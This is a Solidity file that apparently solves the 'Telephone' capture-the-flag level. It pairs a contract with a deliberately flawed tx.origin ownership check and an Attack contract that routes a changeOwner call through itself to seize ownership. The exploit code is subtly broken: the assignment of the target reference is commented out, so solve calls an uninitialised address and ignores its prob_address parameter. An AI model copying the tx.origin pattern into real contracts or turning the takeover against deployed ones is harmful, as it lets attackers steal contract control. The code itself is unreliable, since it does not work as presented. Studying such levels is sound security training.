// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;
  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
contract Attack {
    Telephone public telephone;
    // address owner = msg.sender;
    // function attack() public {
    //     telephone.changeOwner(owner);
    // }
    function solve(address prob_address, address owner_address) public {
        //telephone = Telephone(prob_address);
        telephone.changeOwner(owner_address);
    }
}
